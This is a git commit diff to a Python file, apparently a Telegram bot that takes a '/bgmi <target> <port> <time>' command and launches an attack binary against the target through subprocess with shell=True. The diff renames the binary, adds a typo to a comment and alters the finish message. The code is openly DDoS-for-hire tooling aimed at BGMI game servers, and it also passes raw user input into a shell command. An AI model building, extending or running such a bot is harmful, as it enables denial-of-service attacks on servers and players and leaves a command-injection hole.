dc2744140d884da08c4b3cf53a65867fb97fc728
namangandphaddega <zodvikxnaman@gmail.com>
2025-02-25 09:27:43 +0530

    Update e.py

--- e.py
+++ e.py
@@ -227,7 +227,7 @@ def handle_bgmi(message):
             bgmi_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
+        if len(command) == 4:  # Updateokd to accept target, time, and port
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
@@ -237,9 +237,9 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./tom.txt {target} {port} {time}"
+                full_command = f"./Moin {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time} 250"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
